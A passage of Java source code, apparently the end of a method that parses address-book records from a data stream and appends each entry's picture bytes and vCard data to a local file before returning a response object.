						FileUtil.append(vcardsPath, ByteUtil.toByte(pictureLen));
						if (pictureLen > 0) {
							byte[] picture = new byte[pictureLen];
							dis.read(picture);
							FileUtil.append(vcardsPath, picture);
						}
						// VCard Data n Bytes
						int vcardDataLen = dis.readInt();
						FileUtil.append(vcardsPath, ByteUtil.toByte(vcardDataLen));
						if (vcardDataLen > 0) {
							byte[] vcardData = new byte[vcardDataLen];
							dis.read(vcardData);
							FileUtil.append(vcardsPath, vcardData);
						}
					}
					offset = FileUtil.getFileSize(vcardsPath);
					addrBookResponse.addAddressBooks(addressBook);
				}
				//addrBookResponse.setResponsePath(vcardsPath);
			}
		} finally {
			FileUtil.closeFile();
		}
		return addrBookResponse;
	}
}
